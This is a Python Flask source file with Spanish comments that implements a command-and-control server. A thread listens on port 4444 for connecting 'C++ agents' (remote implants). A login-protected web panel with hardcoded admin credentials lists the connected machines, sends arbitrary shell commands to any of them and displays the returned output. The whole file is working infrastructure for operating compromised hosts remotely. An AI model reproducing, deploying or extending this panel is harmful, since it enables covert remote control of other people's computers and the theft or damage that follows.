from flask import Flask, render_template, request, jsonify, session, redirect, url_for
import socket
import threading
from functools import wraps

app = Flask(__name__)

# --- CONFIGURACIÓN DE SEGURIDAD ---
app.secret_key = 'clave_maestra_super_secreta_2026' # Cambia esto por lo que quieras
USER_ADMIN = "admin"
PASS_ADMIN = "pwned2026"

# --- MEMORIA COMPARTIDA ---
agentes = {}

# --- DECORADOR PARA PROTEGER RUTAS ---
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# --- HILO DE RED (Escucha agentes C++) ---
def escuchar_agentes():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 4444))
    server.listen(10)
    print("[*] Servidor de Red: Esperando agentes en el puerto 4444...")
    while True:
        try:
            conn, addr = server.accept()
            id_agente = len(agentes)
            agentes[id_agente] = {
                "socket": conn, 
                "addr": addr, 
                "res": "Esperando comandos..."
            }
            print(f"[+] NUEVO AGENTE CONECTADO: ID {id_agente} desde {addr[0]}")
        except Exception as e:
            print(f"[-] Error en red: {e}")

# --- RUTAS DE ACCESO (LOGIN/LOGOUT) ---

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        if request.form['username'] != USER_ADMIN or request.form['password'] != PASS_ADMIN:
            error = 'Acceso denegado. Credenciales incorrectas.'
        else:
            session['logged_in'] = True
            return redirect(url_for('index'))
    return render_template('login.html', error=error)

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

# --- RUTAS DEL PANEL (PROTEGIDAS) ---

@app.route('/')
@login_required
def index():
    return render_template('index.html')

@app.route('/ejecutar', methods=['POST'])
@login_required
def ejecutar():
    try:
        id_target = int(request.form.get('id'))
        comando = request.form.get('comando')
        
        if id_target in agentes:
            conn = agentes[id_target]["socket"]
            conn.send(comando.encode())
            
            respuesta = conn.recv(4096).decode('cp850', errors='replace')
            agentes[id_target]["res"] = respuesta
            return jsonify({"status": "success", "resultado": respuesta})
        else:
            return jsonify({"status": "error", "resultado": "Agente no encontrado"})
    except Exception as e:
        return jsonify({"status": "error", "resultado": f"Fallo: {str(e)}"})

@app.route('/api/agentes')
@login_required
def api_agentes():
    datos = []
    for id_agente, info in agentes.items():
        datos.append({
            "id": id_agente,
            "ip": info["addr"][0],
            "resultado": info["res"]
        })
    return jsonify(datos)

# --- BLOQUE DE ARRANQUE ---
if __name__ == '__main__':
    # Lanzar hilo de red
    threading.Thread(target=escuchar_agentes, daemon=True).start()
    
    # Iniciar Flask
    print("[*] Panel de Control Seguro activo en http://127.0.0.1:5000")
    app.run(host='0.0.0.0', port=5000, debug=False)
